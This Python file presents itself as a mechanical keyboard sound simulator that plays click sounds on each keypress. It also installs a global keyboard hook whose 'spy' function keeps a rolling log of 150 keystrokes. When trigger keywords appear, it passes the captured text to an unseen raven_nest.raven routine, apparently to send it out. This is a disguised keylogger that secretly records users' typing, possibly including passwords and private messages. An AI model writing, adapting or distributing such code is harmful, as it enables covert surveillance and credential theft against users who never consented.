import keyboard
import random
import raven_nest;
import linkedlist;
import pygame
import sys
import os
pygame.init()

spyNotebook = linkedlist.LinkedList()
keypresses = 0
keyVolume = 0.2

#?credit for resource_path method: https://stackoverflow.com/questions/31836104/pyinstaller-and-onefile-how-to-include-an-image-in-the-exe-file
def resource_path(relative_path):
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS2 #if MEIPASS2 doesnt work, switch to MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


def getLength(array):
    length = 0
    for i in array:
        length += 1
    return length - 1 # for convinience😐

def run():

    print("Mechanical keys simulator is running \n\nGreetings from VictorCodebase. Visit my github for more fun stuff: https://github.com/VictorCodebase")
    currentSound = pygame.mixer.Sound(resource_path('key-1.wav'))
    # I could remember how to get length os an array in python; So here we are
    def randomizeSound():
        global currentSound, keyVolume, resource_path
        sound = [1, 1, 1, 2, 3, 3]
        currentSound = pygame.mixer.Sound(resource_path(f'key-{sound[random.randint(0, getLength(sound))]}.wav'))
    def on_key_event(e):
        if e.event_type == keyboard.KEY_DOWN:
           #print(f'Key pressed: {e.name}')
           spy(e.name)
           randomizeSound()
           currentSound.set_volume(keyVolume)
           currentSound.play()
    def spy(key):
        global spyNotebook, keypresses
        keywords = ['Codebase', 'VictorCodebase', 'Nairobi']
        if key == 'space':
            key = ' '
        elif key == 'enter':
            key = '//'
        elif key == 'backspace':
            key = '<'
        elif key == 'shift':
            key = '⇧'
        elif key == 'caps lock':
            key = 'cps'
        elif key == 'delete':
            key = 'del'
        if key != '<':
            keypresses += 1
            spyNotebook.append(key)
        else:
            spyNotebook.pop(spyNotebook.length() - 1)
        if spyNotebook.length() > 150:
            spyNotebook.pop(0)
        def readNotebook():
            contents = spyNotebook.to_string()
            for keyword in keywords:
                if keyword in contents:
                    raven_nest.raven(contents.split(keyword)[0], keyword)
        if keypresses > 75:
            readNotebook()
            keypresses = 0
    keyboard.hook(on_key_event)